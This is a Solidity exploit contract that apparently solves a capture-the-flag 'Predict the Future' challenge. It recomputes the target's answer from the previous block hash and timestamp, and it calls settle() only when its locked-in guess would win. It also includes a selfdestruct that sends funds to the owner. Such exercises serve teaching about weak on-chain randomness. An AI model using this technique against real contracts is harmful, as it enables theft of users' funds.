//SPDX-License-Identifier: Unlicense
pragma solidity ^0.4.21;


import "./Ownable_4_21.sol";

interface IPredictTheFutureChallenge{
    function isComplete() external view returns (bool);
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract PredictTheFutureChallengeExploit is Ownable {

    IPredictTheFutureChallenge private _target;
    uint8 private _guess;
    function PredictTheFutureChallengeExploit(address target) public {
        _target = IPredictTheFutureChallenge(target);
    }

    function lockInGuess(uint8 n) public payable {
        _guess = n;
        _target.lockInGuess.value(msg.value)(_guess);
    }
    function tryRunExploit() onlyOwner public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        if(answer == _guess){
            _target.settle();
        }
    }

    function cleanup() onlyOwner public {
        selfdestruct(owner());
    }

    function() external payable {}
}